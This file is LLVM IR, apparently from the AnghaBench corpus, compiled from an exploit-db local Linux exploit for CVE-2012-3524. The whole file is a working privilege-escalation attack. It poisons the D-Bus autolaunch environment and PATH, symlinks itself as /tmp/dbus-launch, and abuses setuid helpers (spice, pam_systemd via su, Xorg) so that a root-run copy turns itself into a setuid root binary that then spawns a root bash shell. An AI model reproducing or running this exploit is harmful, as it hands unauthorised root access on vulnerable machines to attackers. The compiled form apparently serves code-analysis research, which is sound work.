; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21323.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_21323.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32 }

@.str = private unnamed_addr constant [40 x i8] c"PATH=/tmp:/usr/bin:/usr/sbin:/sbin:/bin\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"DBUS_STARTER_BUS_TYPE=system\00", align 1
@.str.2 = private unnamed_addr constant [36 x i8] c"DBUS_SYSTEM_BUS_ADDRESS=autolaunch:\00", align 1
@.str.3 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"blah\00", align 1
@__const.main.su = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0), i8* null, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i8* null], align 16
@.str.5 = private unnamed_addr constant [63 x i8] c"/usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper\00", align 1
@__const.main.spice = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.5, i32 0, i32 0), i8* null], align 16
@.str.6 = private unnamed_addr constant [14 x i8] c"/usr/bin/Xorg\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c":7350\00", align 1
@__const.main.xorg = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* null], align 16
@.str.8 = private unnamed_addr constant [17 x i8] c"/tmp/dbus-launch\00", align 1
@__const.main.dbus = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i32 0, i32 0), i8* null], align 16
@.str.9 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"--noprofile\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"--norc\00", align 1
@__const.main.sh = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* null], align 16
@errno = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [78 x i8] c"[**] CVE-2012-3524 xSports -- this is not a dbus exploit!\0A\0A[*] Preparing ...\0A\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"/proc/self/exe\00", align 1
@.str.14 = private unnamed_addr constant [22 x i8] c"/proc/self/path/a.out\00", align 1
@.str.15 = private unnamed_addr constant [28 x i8] c"[+] Using spice helper ...\0A\00", align 1
@.str.16 = private unnamed_addr constant [31 x i8] c"/lib64/security/pam_systemd.so\00", align 1
@.str.17 = private unnamed_addr constant [64 x i8] c"[+] Using pam_systemd helper (type user passwd when asked) ...\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"DISPLAY=:7350\00", align 1
@.str.19 = private unnamed_addr constant [5 x i8] c"USER\00", align 1
@.str.20 = private unnamed_addr constant [27 x i8] c"[+] Using Xorg helper ...\0A\00", align 1
@.str.21 = private unnamed_addr constant [36 x i8] c"[-] No suitable suid helper found.\0A\00", align 1
@.str.22 = private unnamed_addr constant [52 x i8] c"[*] Waiting 10s for dbus-launch to drop boomshell.\0A\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c".\00", align 1
@stdout = common dso_local global i32 0, align 4
@SIGKILL = common dso_local global i32 0, align 4
@.str.24 = private unnamed_addr constant [13 x i8] c"\0A[!] Hurra!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.stat, align 4
  %8 = alloca i32, align 4
  %9 = alloca [5 x i8*], align 16
  %10 = alloca [4 x i8*], align 16
  %11 = alloca [2 x i8*], align 16
  %12 = alloca [3 x i8*], align 16
  %13 = alloca i8**, align 8
  %14 = alloca [2 x i8*], align 16
  %15 = alloca [4 x i8*], align 16
  %16 = alloca [4096 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %8, align 4
  %17 = bitcast [5 x i8*]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %17, i8 0, i64 40, i1 false)
  %18 = bitcast i8* %17 to [5 x i8*]*
  %19 = getelementptr inbounds [5 x i8*], [5 x i8*]* %18, i32 0, i32 0
  store i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str, i32 0, i32 0), i8** %19, align 16
  %20 = getelementptr inbounds [5 x i8*], [5 x i8*]* %18, i32 0, i32 1
  store i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i32 0, i32 0), i8** %20, align 8
  %21 = getelementptr inbounds [5 x i8*], [5 x i8*]* %18, i32 0, i32 2
  store i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.2, i32 0, i32 0), i8** %21, align 16
  %22 = bitcast [4 x i8*]* %10 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %22, i8* align 16 bitcast ([4 x i8*]* @__const.main.su to i8*), i64 32, i1 false)
  %23 = bitcast [2 x i8*]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %23, i8* align 16 bitcast ([2 x i8*]* @__const.main.spice to i8*), i64 16, i1 false)
  %24 = bitcast [3 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %24, i8* align 16 bitcast ([3 x i8*]* @__const.main.xorg to i8*), i64 24, i1 false)
  %25 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 0
  store i8** %25, i8*** %13, align 8
  %26 = bitcast [2 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %26, i8* align 16 bitcast ([2 x i8*]* @__const.main.dbus to i8*), i64 16, i1 false)
  %27 = bitcast [4 x i8*]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %27, i8* align 16 bitcast ([4 x i8*]* @__const.main.sh to i8*), i64 32, i1 false)
  %28 = call i64 (...) @geteuid()
  %29 = icmp eq i64 %28, 0
  br i1 %29, label %30, label %38

30:                                               ; preds = %2
  %31 = load i32, i32* %4, align 4
  %32 = icmp sgt i32 %31, 1
  br i1 %32, label %33, label %38

33:                                               ; preds = %30
  %34 = call i32 @chown(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0), i32 0, i32 0)
  %35 = call i32 @chmod(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0), i32 2541)
  %36 = load i32, i32* @errno, align 4
  %37 = call i32 @exit(i32 %36) #4
  unreachable

38:                                               ; preds = %30, %2
  %39 = call i64 (...) @geteuid()
  %40 = icmp eq i64 %39, 0
  br i1 %40, label %41, label %48

41:                                               ; preds = %38
  %42 = call i32 @setuid(i32 0)
  %43 = getelementptr inbounds [4 x i8*], [4 x i8*]* %15, i64 0, i64 0
  %44 = load i8*, i8** %43, align 16
  %45 = getelementptr inbounds [4 x i8*], [4 x i8*]* %15, i64 0, i64 0
  %46 = call i32 @execve(i8* %44, i8** %45, i8** null)
  %47 = load i32, i32* @errno, align 4
  store i32 %47, i32* %3, align 4
  br label %152

48:                                               ; preds = %38
  br label %49

49:                                               ; preds = %48
  %50 = call i32 @printf(i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.12, i64 0, i64 0))
  %51 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %52 = call i32 @memset(i8* %51, i32 0, i32 4096)
  %53 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %54 = call i64 @readlink(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0), i8* %53, i32 4095)
  %55 = icmp slt i64 %54, 0
  br i1 %55, label %56, label %59

56:                                               ; preds = %49
  %57 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %58 = call i64 @readlink(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.14, i64 0, i64 0), i8* %57, i32 4095)
  br label %59

59:                                               ; preds = %56, %49
  %60 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %61 = call i32 @symlink(i8* %60, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %62 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  %63 = load i8*, i8** %62, align 16
  %64 = call i64 @stat(i8* %63, %struct.stat* %7)
  %65 = icmp eq i64 %64, 0
  br i1 %65, label %66, label %75

66:                                               ; preds = %59
  %67 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = and i32 %68, 2048
  %70 = icmp eq i32 %69, 2048
  br i1 %70, label %71, label %74

71:                                               ; preds = %66
  %72 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.15, i64 0, i64 0))
  %73 = getelementptr inbounds [2 x i8*], [2 x i8*]* %11, i64 0, i64 0
  store i8** %73, i8*** %13, align 8
  br label %74

74:                                               ; preds = %71, %66
  br label %105

75:                                               ; preds = %59
  %76 = call i64 @stat(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.16, i64 0, i64 0), %struct.stat* %7)
  %77 = icmp eq i64 %76, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %75
  %79 = call i32 @printf(i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.17, i64 0, i64 0))
  %80 = getelementptr inbounds [5 x i8*], [5 x i8*]* %9, i64 0, i64 3
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i64 0, i64 0), i8** %80, align 8
  %81 = call i8* @getenv(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.19, i64 0, i64 0))
  %82 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 1
  store i8* %81, i8** %82, align 8
  %83 = getelementptr inbounds [4 x i8*], [4 x i8*]* %10, i64 0, i64 0
  store i8** %83, i8*** %13, align 8
  br label %104

84:                                               ; preds = %75
  %85 = getelementptr inbounds [3 x i8*], [3 x i8*]* %12, i64 0, i64 0
  %86 = load i8*, i8** %85, align 16
  %87 = call i64 @stat(i8* %86, %struct.stat* %7)
  %88 = icmp eq i64 %87, 0
  br i1 %88, label %89, label %100

89:                                               ; preds = %84
  %90 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 0
  %91 = load i32, i32* %90, align 4
  %92 = and i32 %91, 2048
  %93 = icmp eq i32 %92, 2048
  br i1 %93, label %94, label %96

94:                                               ; preds = %89
  %95 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.20, i64 0, i64 0))
  br label %99

96:                                               ; preds = %89
  %97 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.21, i64 0, i64 0))
  %98 = call i32 @exit(i32 0) #4
  unreachable

99:                                               ; preds = %94
  br label %103

100:                                              ; preds = %84
  %101 = call i32 @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.21, i64 0, i64 0))
  %102 = call i32 @exit(i32 0) #4
  unreachable

103:                                              ; preds = %99
  br label %104

104:                                              ; preds = %103, %78
  br label %105

105:                                              ; preds = %104, %74
  %106 = call i32 (...) @fork()
  store i32 %106, i32* %8, align 4
  %107 = icmp eq i32 %106, 0
  br i1 %107, label %108, label %115

108:                                              ; preds = %105
  %109 = load i8**, i8*** %13, align 8
  %110 = load i8*, i8** %109, align 8
  %111 = load i8**, i8*** %13, align 8
  %112 = getelementptr inbounds [5 x i8*], [5 x i8*]* %9, i64 0, i64 0
  %113 = call i32 @execve(i8* %110, i8** %111, i8** %112)
  %114 = call i32 @exit(i32 0) #4
  unreachable

115:                                              ; preds = %105
  %116 = call i32 @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.22, i64 0, i64 0))
  store i32 0, i32* %6, align 4
  br label %117

117:                                              ; preds = %125, %115
  %118 = load i32, i32* %6, align 4
  %119 = icmp slt i32 %118, 10
  br i1 %119, label %120, label %128

120:                                              ; preds = %117
  %121 = call i32 @sleep(i32 1)
  %122 = call i32 @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i64 0, i64 0))
  %123 = load i32, i32* @stdout, align 4
  %124 = call i32 @fflush(i32 %123)
  br label %125

125:                                              ; preds = %120
  %126 = load i32, i32* %6, align 4
  %127 = add nsw i32 %126, 1
  store i32 %127, i32* %6, align 4
  br label %117

128:                                              ; preds = %117
  %129 = load i32, i32* %8, align 4
  %130 = load i32, i32* @SIGKILL, align 4
  %131 = call i32 @kill(i32 %129, i32 %130)
  %132 = load i32, i32* %8, align 4
  %133 = call i32 @waitpid(i32 %132, i32* null, i32 0)
  br label %134

134:                                              ; preds = %143, %128
  %135 = getelementptr inbounds [2 x i8*], [2 x i8*]* %14, i64 0, i64 0
  %136 = load i8*, i8** %135, align 16
  %137 = call i64 @stat(i8* %136, %struct.stat* %7)
  %138 = getelementptr inbounds %struct.stat, %struct.stat* %7, i32 0, i32 0
  %139 = load i32, i32* %138, align 4
  %140 = and i32 %139, 2541
  %141 = icmp eq i32 %140, 2541
  br i1 %141, label %142, label %143

142:                                              ; preds = %134
  br label %145

143:                                              ; preds = %134
  %144 = call i32 @sleep(i32 1)
  br label %134

145:                                              ; preds = %142
  %146 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.24, i64 0, i64 0))
  %147 = getelementptr inbounds [2 x i8*], [2 x i8*]* %14, i64 0, i64 0
  %148 = load i8*, i8** %147, align 16
  %149 = getelementptr inbounds [2 x i8*], [2 x i8*]* %14, i64 0, i64 0
  %150 = call i32 @execve(i8* %148, i8** %149, i8** null)
  %151 = load i32, i32* @errno, align 4
  store i32 %151, i32* %3, align 4
  br label %152

152:                                              ; preds = %145, %41
  %153 = load i32, i32* %3, align 4
  ret i32 %153
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i64 @geteuid(...) #2

declare dso_local i32 @chown(i8*, i32, i32) #2

declare dso_local i32 @chmod(i8*, i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @setuid(i32) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i64 @readlink(i8*, i8*, i32) #2

declare dso_local i32 @symlink(i8*, i8*) #2

declare dso_local i64 @stat(i8*, %struct.stat*) #2

declare dso_local i8* @getenv(i8*) #2

declare dso_local i32 @fork(...) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @kill(i32, i32) #2

declare dso_local i32 @waitpid(i32, i32*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
